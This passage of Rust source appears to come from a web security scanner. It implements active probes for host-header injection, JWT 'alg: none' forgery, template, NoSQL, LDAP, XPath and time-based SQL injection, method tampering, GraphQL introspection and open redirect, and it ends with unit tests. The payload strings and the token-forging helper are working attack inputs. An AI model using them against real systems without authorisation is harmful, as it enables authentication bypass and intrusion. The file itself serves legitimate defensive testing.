        for &(header, value) in variants {
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            r.headers.set(header, value);
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            let resp = match self.send(&r).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            // Did the attacker domain appear in a redirect target? That
            // is the strongest signal — one request away from the
            // password-reset-link / cache-poisoning chain.
            let in_location = resp
                .headers
                .get("Location")
                .map(|loc| loc.contains(evil))
                .unwrap_or(false);
            let in_body = body_contains(&resp, evil);
            if !in_location && !in_body {
                continue;
            }
            let (severity, confidence, sink) = if in_location {
                (Severity::Medium, Confidence::Firm, "Location header")
            } else {
                (Severity::Low, Confidence::Tentative, "response body")
            };
            let mut f = Finding::new(
                "host-header-injection",
                &format!("Host header injection via `{header}`"),
                severity,
                confidence,
            );
            f.description = format!(
                "Supplying `{header}: {value}` caused the attacker-controlled domain to appear in the {sink}. In many frameworks this is the first step of a password-reset poisoning or web-cache poisoning chain."
            );
            f.evidence = format!(
                "Mutated header: `{header}: {value}`. Attacker domain `{evil}` observed in {sink}."
            );
            f.remediation = "Treat Host-equivalent headers as untrusted. Pin the application's canonical hostname at the deployment layer and reject requests whose declared host doesn't match; never derive URLs from `Host` / `X-Forwarded-Host` for links sent to users.".into();
            f.transaction_id = Some(tx.id);
            f.references = vec!["CWE-20".into(), "CWE-444".into()];
            findings.push(f);
        }
        Ok(findings)
    }

    // ---- JWT alg=none ---------------------------------------------------
    //
    // Scan Authorization / Cookie / query params for anything that
    // *looks* like a JWT (three base64url chunks separated by dots).
    // For each candidate: decode the header, flip `alg` to `none`,
    // strip the signature, and resend the mutated request. If the
    // baseline was 401/403 and the mutated one is 2xx, the server
    // trusts unsigned tokens — Critical.
    async fn scan_jwt_none(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        // Only run when we have a baseline response to compare against.
        let baseline_status = match tx.response.as_ref().map(|r| r.status) {
            Some(s) => s,
            None => return Ok(Vec::new()),
        };
        // Harvest JWT candidates from the common injection points.
        let jwt_re = Regex::new(r"\b([A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*)\b")
            .expect("static regex");
        let mut candidates: Vec<(String, String)> = Vec::new(); // (where, token)
        if let Some(auth) = tx.request.headers.get("Authorization") {
            for cap in jwt_re.captures_iter(&auth) {
                candidates.push(("Authorization header".to_string(), cap[1].to_string()));
            }
        }
        if let Some(cookie) = tx.request.headers.get("Cookie") {
            for cap in jwt_re.captures_iter(&cookie) {
                candidates.push(("Cookie header".to_string(), cap[1].to_string()));
            }
        }
        for (name, value) in tx.request.query_params() {
            for cap in jwt_re.captures_iter(&value) {
                candidates.push((format!("query parameter `{name}`"), cap[1].to_string()));
            }
        }
        let mut findings = Vec::new();
        for (where_found, token) in candidates {
            let forged = match forge_jwt_none(&token) {
                Some(t) => t,
                None => continue,
            };
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            replace_jwt_everywhere(&mut r, &token, &forged);
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            let resp = match self.send(&r).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            // Vulnerable pattern: baseline was 401/403 and the
            // mutated token is accepted (2xx). We deliberately
            // require the baseline to be an auth-failure so a
            // noisy anonymous endpoint doesn't false-positive.
            let was_rejected = matches!(baseline_status, 401 | 403);
            let now_accepted = (200..300).contains(&resp.status);
            if was_rejected && now_accepted {
                let mut f = Finding::new(
                    "jwt-none-algorithm",
                    "JWT `alg: none` accepted",
                    Severity::Critical,
                    Confidence::Firm,
                );
                f.description = format!(
                    "A JSON Web Token observed in {where_found} was stripped of its signature and re-signed with `alg: none`; the server still accepted it. This is a complete authentication bypass — any attacker can mint arbitrary claims."
                );
                f.evidence = format!(
                    "Baseline response: HTTP {baseline_status}. Mutated-token response: HTTP {}. Original token (first 48 chars): `{}…`",
                    resp.status,
                    &token[..token.len().min(48)]
                );
                f.remediation = "Reject tokens whose `alg` is `none` or whose `alg` is not in the service's expected algorithm list. Use a JWT library that pins the verification key by algorithm.".into();
                f.transaction_id = Some(tx.id);
                f.references = vec!["CWE-347".into(), "RFC-7519".into()];
                findings.push(f);
            }
        }
        Ok(findings)
    }

    // ---- Server-Side Template Injection ---------------------------------
    //
    // Each engine has a distinctive math-eval syntax. We send each
    // payload once per query parameter and look for the evaluated
    // marker ("49" from 7*7, or "7777777" from 7 * '7' which only
    // Jinja2/Twig support). Positive signal is: the marker appears
    // AND the raw payload does not — the latter guard eliminates
    // false positives where the app just echoes the query string
    // verbatim into the response.
    async fn scan_ssti(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        // (payload, expected eval marker, engine label).
        let payloads: &[(&str, &str, &str)] = &[
            ("{{7*7}}", "49", "Jinja2 / Twig / Nunjucks"),
            ("{{7*'7'}}", "7777777", "Jinja2 / Twig (string-mul)"),
            ("${7*7}", "49", "Freemarker / Mako / JSP EL"),
            ("<%= 7*7 %>", "49", "ERB / EJS"),
            ("*{7*7}", "49", "Thymeleaf"),
            ("#{7*7}", "49", "Spring / Pebble"),
        ];
        let mut findings = Vec::new();
        for (name, _) in tx.request.query_params() {
            for (payload, marker, engine) in payloads {
                let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
                mutate_query_param(&mut r, &name, payload);
                if !self.scope.is_in_scope(&r) {
                    continue;
                }
                let resp = match self.send(&r).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let text = String::from_utf8_lossy(&resp.body);
                // Positive = marker present + raw payload absent.
                // Short payload substrings would otherwise trip on
                // "49" occurring naturally in body text, so we tighten
                // by also requiring the payload characters (`{{`,
                // `${`, `<%`) to have been consumed.
                let evaluated = text.contains(marker) && !text.contains(payload);
                if !evaluated {
                    continue;
                }
                let mut f = Finding::new(
                    "ssti",
                    &format!("Server-Side Template Injection via `{name}` ({engine})"),
                    Severity::Critical,
                    Confidence::Firm,
                );
                f.description = format!(
                    "Supplying `{payload}` in query parameter `{name}` caused the server-side template engine to evaluate the expression and inline the result (`{marker}`) into the response. SSTI typically escalates to Remote Code Execution via the template's native sandbox-escape primitives."
                );
                f.evidence = format!(
                    "Payload: `{payload}` → marker `{marker}` observed in response. Engine family: {engine}."
                );
                f.remediation = "Never pass user-controlled input to a template string. If templates must be user-authored, sandbox the engine (Jinja2 `SandboxedEnvironment`, Twig `SandboxExtension`), restrict callable attributes, and ban reflection primitives.".into();
                f.transaction_id = Some(tx.id);
                f.references = vec!["CWE-1336".into(), "CWE-94".into()];
                findings.push(f);
                // One finding per parameter is enough — different
                // engines all evidence the same bug class on this
                // param.
                break;
            }
        }
        Ok(findings)
    }

    // ---- NoSQL injection ------------------------------------------------
    //
    // Two detection paths:
    //
    //   1. **Operator injection.** Rewrite the parameter name from
    //      `name=X` to `name[$ne]=0`. MongoDB (and ORMs on top of it)
    //      interprets this as a native query operator, which flips
    //      the logic from "equals X" to "not equals 0" — so a login
    //      page that returned 401 to `user=alice` returns 200 to
    //      `user[$ne]=0`. Any significant response differential
    //      (status change OR body-length delta ≥ 50%) is the signal.
    //
    //   2. **Error-based.** Replace the parameter value with
    //      `';return 1;//` which breaks naive `$where` string
    //      concatenation. Grep response body for Mongo-ish error
    //      strings.
    async fn scan_nosql(
        &self,
        tx: &Transaction,
        baseline_body_len: usize,
    ) -> Result<Vec<Finding>> {
        let baseline_status = tx.response.as_ref().map(|r| r.status).unwrap_or(0);
        let mut findings = Vec::new();
        for (name, orig_value) in tx.request.query_params() {
            // --- Strategy 1: operator injection ---
            // Build the mutated path by hand: `set_query_params` would
            // percent-encode the `[`/`]` into `%5B`/`%5D`, which many
            // frameworks still decode server-side (so it works), but
            // the literal brackets are more Burp-authentic.
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            let (base_path, existing_query) = match r.path.split_once('?') {
                Some((p, q)) => (p.to_string(), q.to_string()),
                None => (r.path.clone(), String::new()),
            };
            let mut rebuilt: Vec<String> = Vec::new();
            let mut injected = false;
            for pair in existing_query.split('&') {
                if pair.is_empty() {
                    continue;
                }
                let (k, _v) = pair.split_once('=').unwrap_or((pair, ""));
                if k == name {
                    rebuilt.push(format!("{k}[$ne]=0"));
                    injected = true;
                } else {
                    rebuilt.push(pair.to_string());
                }
            }
            if !injected {
                rebuilt.push(format!("{name}[$ne]=0"));
            }
            r.path = format!("{base_path}?{}", rebuilt.join("&"));
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            if let Ok(resp) = self.send(&r).await {
                let status_changed = resp.status != baseline_status && baseline_status != 0;
                let body_delta = {
                    let len_now = resp.body.len() as i64;
                    let base = baseline_body_len as i64;
                    if base == 0 {
                        len_now > 100 // non-trivial response from nothing
                    } else {
                        let diff = (len_now - base).abs() as f64;
                        diff / (base as f64) >= 0.5
                    }
                };
                if status_changed || body_delta {
                    let mut f = Finding::new(
                        "nosql-injection",
                        &format!("NoSQL operator injection via `{name}`"),
                        Severity::High,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Rewriting the parameter `{name}` as `{name}[$ne]=0` produced a response that differs materially from the baseline — a classic indicator that the backend interprets structured operators (MongoDB `$ne`) from untrusted input, bypassing predicate logic."
                    );
                    f.evidence = format!(
                        "Baseline: HTTP {baseline_status} / {baseline_body_len} B. Operator-injected: HTTP {} / {} B.",
                        resp.status,
                        resp.body.len()
                    );
                    f.remediation = "Cast user input to the expected scalar type before building queries; prefer typed query builders / ODMs over string construction; disable `$where` and other eval operators at the DB driver level.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-943".into()];
                    findings.push(f);
                    continue; // one finding per parameter
                }
            }
            // --- Strategy 2: error-based ---
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            // `set_query_params` is fine here — the value is URL-safe
            // once percent-encoded.
            mutate_query_param(&mut r, &name, "';return 1;//");
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            if let Ok(resp) = self.send(&r).await {
                let text = String::from_utf8_lossy(&resp.body);
                let error_patterns = [
                    "MongoError",
                    "MongoServerError",
                    "BadValue",
                    "SyntaxError: Unexpected token",
                    "Cannot find module 'mongo",
                    "MongooseError",
                ];
                if let Some(hit) = error_patterns.iter().find(|p| text.contains(**p)) {
                    let mut f = Finding::new(
                        "nosql-injection",
                        &format!("NoSQL error-based injection via `{name}`"),
                        Severity::Medium,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Supplying a JavaScript-eval breaker in parameter `{name}` triggered a Mongo-ish error message in the response, indicating that user input is concatenated into a `$where`-style eval expression without sanitisation."
                    );
                    f.evidence = format!("Payload: `';return 1;//`. Error marker: `{hit}`.");
                    f.remediation = "Disable `$where` on the DB driver and use typed query builders. Treat all DB errors as internal — never return them in a response.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-943".into()];
                    findings.push(f);
                }
            }
            // Preserve orig_value binding so clippy doesn't warn.
            let _ = orig_value;
        }
        Ok(findings)
    }

    // ---- LDAP injection -------------------------------------------------
    //
    // Shared logic with XPath / NoSQL: operator-injection with a
    // differential signal + known error-string grep. LDAP's native
    // `*` wildcard turns a `(uid=X)` filter into `(uid=*)` which
    // typically widens the result set significantly, so an empty
    // baseline body becoming populated is the main tell.
    async fn scan_ldap(
        &self,
        tx: &Transaction,
        baseline_body_len: usize,
    ) -> Result<Vec<Finding>> {
        let baseline_status = tx.response.as_ref().map(|r| r.status).unwrap_or(0);
        let payloads: &[&str] = &["*)(uid=*))", "*)(cn=*))", "*", "*)(|(uid=*))"];
        let error_patterns = [
            "LDAPException",
            "javax.naming",
            "com.sun.jndi.ldap",
            "ldap_search",
            "Supplied argument is not a valid ldap",
            "LdapErr: DSID",
        ];
        let mut findings = Vec::new();
        for (name, _) in tx.request.query_params() {
            for payload in payloads {
                let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
                mutate_query_param(&mut r, &name, payload);
                if !self.scope.is_in_scope(&r) {
                    continue;
                }
                let resp = match self.send(&r).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let text = String::from_utf8_lossy(&resp.body);
                // Error-based: a known LDAP error string in the body.
                if let Some(err) = error_patterns.iter().find(|p| text.contains(**p)) {
                    let mut f = Finding::new(
                        "ldap-injection",
                        &format!("LDAP injection (error-based) via `{name}`"),
                        Severity::High,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Supplying an LDAP operator payload in parameter `{name}` triggered a native LDAP error message. The application interpolates user input into an LDAP filter without proper escaping."
                    );
                    f.evidence = format!("Payload: `{payload}`. Error marker: `{err}`.");
                    f.remediation = "Escape all special LDAP filter characters (`\\`, `*`, `(`, `)`, `\\0`) in untrusted input. Prefer parameterised LDAP APIs where available.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-90".into()];
                    findings.push(f);
                    break;
                }
                // Differential: status change or body-length delta.
                let status_changed = resp.status != baseline_status && baseline_status != 0;
                let body_delta = response_delta(resp.body.len(), baseline_body_len);
                if status_changed || body_delta {
                    let mut f = Finding::new(
                        "ldap-injection",
                        &format!("LDAP injection (differential) via `{name}`"),
                        Severity::High,
                        Confidence::Tentative,
                    );
                    f.description = format!(
                        "Supplying the LDAP wildcard-operator payload `{payload}` in parameter `{name}` produced a response that differs materially from the baseline, suggesting the filter interpreted the metacharacters."
                    );
                    f.evidence = format!(
                        "Baseline: HTTP {baseline_status} / {baseline_body_len} B. Mutated: HTTP {} / {} B.",
                        resp.status,
                        resp.body.len()
                    );
                    f.remediation = "Escape LDAP special characters; use parameterised APIs.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-90".into()];
                    findings.push(f);
                    break;
                }
            }
        }
        Ok(findings)
    }

    // ---- XPath injection ------------------------------------------------
    //
    // Boolean injection (`' or '1'='1`) typically converts a selective
    // query into a universal one, so differential signal is the main
    // positive. Error-based grep covers deployments that leak XPath
    // library exceptions.
    async fn scan_xpath(
        &self,
        tx: &Transaction,
        baseline_body_len: usize,
    ) -> Result<Vec<Finding>> {
        let baseline_status = tx.response.as_ref().map(|r| r.status).unwrap_or(0);
        let payloads: &[&str] = &[
            "' or '1'='1",
            "') or ('1'='1",
            "' or 1=1 or 'a'='a",
            "'' or 1=1 or ''='",
        ];
        let error_patterns = [
            "XPathException",
            "MS.Internal.Xml",
            "Unknown operator",
            "XPST",
            "System.Xml.XPath",
            "xmlXPathEval",
            "SimpleXMLElement::xpath",
        ];
        let mut findings = Vec::new();
        for (name, _) in tx.request.query_params() {
            for payload in payloads {
                let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
                mutate_query_param(&mut r, &name, payload);
                if !self.scope.is_in_scope(&r) {
                    continue;
                }
                let resp = match self.send(&r).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let text = String::from_utf8_lossy(&resp.body);
                if let Some(err) = error_patterns.iter().find(|p| text.contains(**p)) {
                    let mut f = Finding::new(
                        "xpath-injection",
                        &format!("XPath injection (error-based) via `{name}`"),
                        Severity::High,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Supplying an XPath boolean payload in parameter `{name}` triggered an XPath library error. The application interpolates user input into an XPath expression without proper escaping."
                    );
                    f.evidence = format!("Payload: `{payload}`. Error marker: `{err}`.");
                    f.remediation = "Use XPath variable binding (XPath 2.0 / XQuery `declare variable`) or escape user input before concatenation. Treat XPath errors as internal — never return them in a response.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-91".into()];
                    findings.push(f);
                    break;
                }
                let status_changed = resp.status != baseline_status && baseline_status != 0;
                let body_delta = response_delta(resp.body.len(), baseline_body_len);
                if status_changed || body_delta {
                    let mut f = Finding::new(
                        "xpath-injection",
                        &format!("XPath injection (boolean / differential) via `{name}`"),
                        Severity::High,
                        Confidence::Tentative,
                    );
                    f.description = format!(
                        "Supplying the boolean payload `{payload}` in parameter `{name}` produced a response that differs materially from the baseline, suggesting the XPath predicate was re-interpreted."
                    );
                    f.evidence = format!(
                        "Baseline: HTTP {baseline_status} / {baseline_body_len} B. Mutated: HTTP {} / {} B.",
                        resp.status,
                        resp.body.len()
                    );
                    f.remediation = "Use variable binding; never concatenate user input into XPath expressions.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-91".into()];
                    findings.push(f);
                    break;
                }
            }
        }
        Ok(findings)
    }

    // ---- Blind time-based SQLi ------------------------------------------
    //
    // Opt-in probe. For each query parameter we fire a `SLEEP(2)`
    // payload per common dialect; a wall-clock jump ≥ 1800 ms AND a
    // baseline that was < 1000 ms is the signal. Lower bounds dodge
    // false positives on genuinely-slow endpoints.
    async fn scan_blind_sql_time(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        // Need a baseline latency measurement — only run when the
        // transaction carries an elapsed_ms (which Repeater / Proxy
        // both set).
        let baseline_ms = tx
            .response
            .as_ref()
            .map(|r| r.elapsed_ms)
            .unwrap_or(u64::MAX);
        // Floor so we don't flag already-slow endpoints.
        if baseline_ms >= 1_000 {
            return Ok(Vec::new());
        }
        let payloads: &[(&str, &str)] = &[
            ("' AND SLEEP(2)-- -", "MySQL"),
            ("'; WAITFOR DELAY '0:0:2'-- ", "MSSQL"),
            ("' AND pg_sleep(2)-- ", "PostgreSQL"),
            ("||pg_sleep(2)", "PostgreSQL concat"),
        ];
        let threshold_ms = 1_800u64;
        let mut findings = Vec::new();
        for (name, _) in tx.request.query_params() {
            for (payload, dialect) in payloads {
                let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
                mutate_query_param(&mut r, &name, payload);
                if !self.scope.is_in_scope(&r) {
                    continue;
                }
                let t0 = std::time::Instant::now();
                let send_result = self.send(&r).await;
                let elapsed = t0.elapsed().as_millis() as u64;
                if send_result.is_err() {
                    continue;
                }
                if elapsed >= threshold_ms {
                    let mut f = Finding::new(
                        "blind-sqli-time",
                        &format!("Blind time-based SQL injection via `{name}` ({dialect})"),
                        Severity::High,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Supplying a time-delay SQL payload in parameter `{name}` caused the response to arrive {elapsed} ms after the request, versus a {baseline_ms} ms baseline. This indicates the backend evaluated the attacker-controlled SQL expression."
                    );
                    f.evidence = format!(
                        "Payload: `{payload}` ({dialect}). Observed latency: {elapsed} ms. Baseline latency: {baseline_ms} ms. Threshold: {threshold_ms} ms."
                    );
                    f.remediation = "Use parameterised queries / prepared statements; never interpolate user input into SQL text.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-89".into()];
                    findings.push(f);
                    break; // one finding per parameter
                }
            }
        }
        Ok(findings)
    }

    // ---- HTTP method tampering ------------------------------------------
    //
    // Only runs on GET endpoints that returned 2xx baseline. For each
    // "dangerous" method we clone the request, swap the verb, zero
    // the body, and send. A 2xx response to PUT/DELETE/PATCH is a
    // strong indicator the server honours the method; TRACE
    // acceptance is also usually a misconfiguration (XST risk).
    async fn scan_method_tampering(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let baseline_method = tx.request.method.to_ascii_uppercase();
        if baseline_method != "GET" {
            return Ok(Vec::new());
        }
        let baseline_status = tx.response.as_ref().map(|r| r.status).unwrap_or(0);
        if !(200..300).contains(&baseline_status) {
            return Ok(Vec::new());
        }
        // Methods worth flagging if accepted on an endpoint the
        // baseline suggests is read-only.
        let methods: &[(&str, Severity)] = &[
            ("PUT", Severity::High),
            ("DELETE", Severity::High),
            ("PATCH", Severity::Medium),
            ("TRACE", Severity::Low),
        ];
        let mut findings = Vec::new();
        for (method, severity) in methods {
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            r.method = (*method).to_string();
            r.body = Vec::new();
            r.headers.remove("Content-Length");
            r.headers.remove("Content-Type");
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            let resp = match self.send(&r).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            // 2xx on a dangerous verb is the signal. 405 / 400 /
            // 501 are the healthy responses.
            if !(200..300).contains(&resp.status) {
                continue;
            }
            let mut f = Finding::new(
                "method-tampering",
                &format!("HTTP method `{method}` accepted on GET endpoint"),
                *severity,
                Confidence::Firm,
            );
            f.description = format!(
                "The endpoint returned HTTP {} for an unexpected `{method}` request, suggesting the server honours write-type methods on an endpoint whose baseline behaviour is read-only. Depending on the handler, this may enable arbitrary state mutations, cache poisoning, or Cross-Site Tracing (XST) via TRACE.",
                resp.status
            );
            f.evidence = format!(
                "Baseline GET: HTTP {baseline_status}. {method} probe: HTTP {}. {method} body length: {} B.",
                resp.status,
                resp.body.len()
            );
            f.remediation = "Restrict every endpoint to the methods it actually handles; return 405 Method Not Allowed for the rest. Disable TRACE at the reverse-proxy layer.".into();
            f.transaction_id = Some(tx.id);
            f.references = vec!["CWE-650".into(), "CWE-16".into()];
            findings.push(f);
        }
        Ok(findings)
    }

    // ---- GraphQL introspection abuse -----------------------------------
    //
    // Fires when the request path looks like GraphQL (`/graphql`,
    // `/graphiql`, `/api/graphql`) or Content-Type is JSON with a
    // `query` body field. POSTs the canonical introspection query
    // and flags a schema that comes back; introspection is often
    // left enabled in production despite being an information-
    // disclosure vector.
    async fn scan_graphql_introspection(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let path_lc = tx.request.path.to_ascii_lowercase();
        let looks_like_graphql = path_lc.contains("/graphql")
            || path_lc.contains("/graphiql")
            || {
                let ct = tx
                    .request
                    .headers
                    .get("Content-Type")
                    .map(|s| s.to_ascii_lowercase())
                    .unwrap_or_default();
                let body = String::from_utf8_lossy(&tx.request.body);
                ct.contains("application/json")
                    && (body.contains("\"query\"") || body.contains("\"operationName\""))
            };
        if !looks_like_graphql {
            return Ok(Vec::new());
        }
        // Canonical introspection query. Trimmed to the minimum that
        // still exercises the fingerprint (`__schema` + `types`).
        let payload = r#"{"query":"{__schema{types{name}}}"}"#;
        let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
        r.method = "POST".into();
        r.headers.set("Content-Type", "application/json");
        r.body = payload.as_bytes().to_vec();
        r.headers
            .set("Content-Length", r.body.len().to_string());
        if !self.scope.is_in_scope(&r) {
            return Ok(Vec::new());
        }
        let resp = match self.send(&r).await {
            Ok(r) => r,
            Err(_) => return Ok(Vec::new()),
        };
        if !(200..300).contains(&resp.status) {
            return Ok(Vec::new());
        }
        let body = String::from_utf8_lossy(&resp.body);
        // Positive signal: both `__schema` and the shape of a types
        // list come back. Avoids false positives on servers that
        // echo the request body verbatim in error responses.
        let has_schema = body.contains("__schema") || body.contains("\"__schema\"");
        let has_types = body.contains("\"types\"") || body.contains("\"name\":\"String\"");
        if !has_schema || !has_types {
            return Ok(Vec::new());
        }
        let mut f = Finding::new(
            "graphql-introspection",
            "GraphQL introspection enabled",
            Severity::Medium,
            Confidence::Firm,
        );
        f.description = "The GraphQL endpoint responded to a `__schema` introspection query with a schema document. In production this is an information-disclosure vector — attackers can enumerate every type, mutation, and field name without any guesswork, which dramatically accelerates reconnaissance.".into();
        f.evidence = format!(
            "Introspection payload: `{payload}`. Response HTTP {} / {} B contains `__schema`.",
            resp.status,
            resp.body.len()
        );
        f.remediation = "Disable introspection in production (`validationRules: [NoSchemaIntrospectionCustomRule]` in Apollo Server, `GRAPHENE_SETTINGS` in Graphene, etc.) or restrict it to authenticated internal callers.".into();
        f.transaction_id = Some(tx.id);
        f.references = vec!["CWE-200".into()];
        Ok(vec![f])
    }

    // ---- Open redirect -------------------------------------------------
    async fn scan_open_redirect(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        let target = "https://burpfree.example/evil";
        for (name, _) in tx.request.query_params() {
            if !name.to_ascii_lowercase().contains("url")
                && !name.to_ascii_lowercase().contains("redirect")
                && !name.to_ascii_lowercase().contains("return")
                && !name.to_ascii_lowercase().contains("next")
                && !name.to_ascii_lowercase().contains("dest")
            {
                continue;
            }
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            mutate_query_param(&mut r, &name, target);
            if !self.scope.is_in_scope(&r) { continue; }
            if let Ok(resp) = self.send(&r).await {
                if (300..400).contains(&resp.status) {
                    if let Some(loc) = resp.headers.get("Location") {
                        if loc.contains("burpfree.example") {
                            let mut f = Finding::new(
                                "open-redirect",
                                &format!("Open redirect via `{name}`"),
                                Severity::Medium,
                                Confidence::Firm,
                            );
                            f.description = format!("Supplying a fully-qualified URL in `{name}` caused the server to redirect to it unconditionally.");
                            f.evidence = format!("Location: {loc}");
                            f.remediation = "Validate the redirect target against an allow-list of trusted hosts.".into();
                            f.transaction_id = Some(tx.id);
                            findings.push(f);
                        }
                    }
                }
            }
        }
        Ok(findings)
    }
}

fn mutate_query_param(r: &mut Request, name: &str, value: &str) {
    let mut params = r.query_params();
    for p in params.iter_mut() {
        if p.0 == name {
            p.1 = value.to_string();
        }
    }
    r.set_query_params(&params);
}

fn mutate_form_param(r: &mut Request, name: &str, value: &str) {
    if let Some(mut params) = r.form_params() {
        for p in params.iter_mut() {
            if p.0 == name {
                p.1 = value.to_string();
            }
        }
        r.set_form_params(&params);
    }
}

fn body_contains(r: &Response, needle: &str) -> bool {
    String::from_utf8_lossy(&r.body).contains(needle)
}

/// Return true when the mutated response body is "materially
/// different" from the baseline — ≥ 50% size delta, or a non-trivial
/// body appearing where none existed. Shared by LDAP / XPath / NoSQL
/// operator-injection probes so their heuristics stay consistent.
fn response_delta(mutated_len: usize, baseline_len: usize) -> bool {
    let base = baseline_len as i64;
    let now = mutated_len as i64;
    if base == 0 {
        now > 100
    } else {
        let diff = (now - base).abs() as f64;
        diff / (base as f64) >= 0.5
    }
}

/// Rewrite a JWT so its `alg` header claim is `"none"` and the
/// signature segment is empty. Returns `None` if the input doesn't
/// parse as a JWT (three base64url segments) or the header isn't
/// decodable JSON. Preserves the payload bytes verbatim so claims
/// like `sub` / `role` remain intact.
fn forge_jwt_none(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 || parts.len() > 3 {
        return None;
    }
    // Decode the header (base64url, no padding).
    let header_bytes = burpfree_codec::base64url_decode(parts[0]).ok()?;
    let header_str = std::str::from_utf8(&header_bytes).ok()?;
    let mut header_val: serde_json::Value = serde_json::from_str(header_str).ok()?;
    // Must at least look like a JWT header (has `alg` claim).
    header_val.get("alg")?;
    header_val
        .as_object_mut()?
        .insert("alg".into(), serde_json::Value::String("none".into()));
    let new_header_json = serde_json::to_vec(&header_val).ok()?;
    let new_header = burpfree_codec::base64url_encode(&new_header_json);
    // alg=none ⇒ empty signature; keep payload byte-for-byte.
    Some(format!("{new_header}.{}.", parts[1]))
}

/// Replace every literal occurrence of `old` in a request's
/// headers + query string + body with `new`. We don't try to be
/// clever about where the token lives — just rewrite it everywhere
/// so cookies / Authorization / query all pick up the mutation.
fn replace_jwt_everywhere(r: &mut Request, old: &str, new: &str) {
    // Snapshot (name, new-value) rewrites so we don't borrow the
    // header map while mutating it. There are only a handful of
    // headers that typically carry JWTs so the overhead is nil.
    let rewrites: Vec<(String, String)> = r
        .headers
        .as_slice()
        .iter()
        .filter(|h| h.value.contains(old))
        .map(|h| (h.name.clone(), h.value.replace(old, new)))
        .collect();
    for (name, value) in rewrites {
        r.headers.set(name, value);
    }
    if r.path.contains(old) {
        r.path = r.path.replace(old, new);
    }
    if !r.body.is_empty() {
        let s = String::from_utf8_lossy(&r.body).to_string();
        if s.contains(old) {
            r.body = s.replace(old, new).into_bytes();
            r.headers
                .set("Content-Length", r.body.len().to_string());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use burpfree_core::traffic::{Request, Response, Transaction};

    #[test]
    fn probe_id_round_trips_every_variant() {
        // Every Probe::all() entry must survive id → from_id → id.
        for probe in Probe::all() {
            let id = probe.id();
            let parsed = Probe::from_id(id).expect("known id must parse");
            assert_eq!(
                &parsed, probe,
                "id round-trip must hit the same variant for {probe:?} (id {id:?})"
            );
            // Ids are kebab-case so they survive serialization + URL
            // use. No underscores, no spaces, lowercase only.
            assert!(
                id.chars().all(|c| c.is_ascii_lowercase() || c == '-'),
                "id {id:?} must be kebab-case lowercase+hyphen only"
            );
            assert!(!id.is_empty(), "empty id for {probe:?}");
        }
    }

    #[test]
    fn probe_from_id_rejects_unknown_ids() {
        assert!(Probe::from_id("not-a-real-probe").is_none());
        assert!(Probe::from_id("").is_none());
        // Case-sensitive: upper-case variants are rejected so a UI
        // bug can't silently create a new "disabled" bucket.
        assert!(Probe::from_id("Reflected-Xss").is_none());
    }

    #[test]
    fn active_probe_ids_lists_every_variant() {
        let ids = active_probe_ids();
        assert_eq!(ids.len(), Probe::all().len());
        // Spot-check a few — same guard pattern as the passive-side
        // test so renaming a probe id is flagged alongside the UI.
        assert!(ids.contains(&"reflected-xss"));
        assert!(ids.contains(&"blind-sql-time"));
        assert!(ids.contains(&"graphql-introspection"));
        assert_eq!(ids.len(), 19, "current baseline is 19 built-in probes");
        // Order is stable — the UI relies on this for the toggle grid.
        assert_eq!(ids[0], "reflected-xss");
    }

    #[test]
    fn active_probe_default_disabled_matches_opt_in_set() {
        let defaults = active_probe_default_disabled();
        // BlindSqlTime is the only opt-in probe in the baseline
        // config (adds ~2 s per probed parameter).
        assert_eq!(defaults, &["blind-sql-time"]);
        // Every id in the default-disabled list must be a known probe
        // — a drift here means the UI will render a dead row.
        for id in defaults {
            assert!(
                Probe::from_id(id).is_some(),
                "default-disabled id {id:?} must map to a known Probe variant"
            );
        }
        // The baseline `ActiveScanConfig::default` already excludes
        // BlindSqlTime, so flipping its checkbox off at startup is
        // consistent with current engine behaviour.
        let defaults_cfg = ActiveScanConfig::default();
        assert!(!defaults_cfg.probes.contains(&Probe::BlindSqlTime));
    }

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;

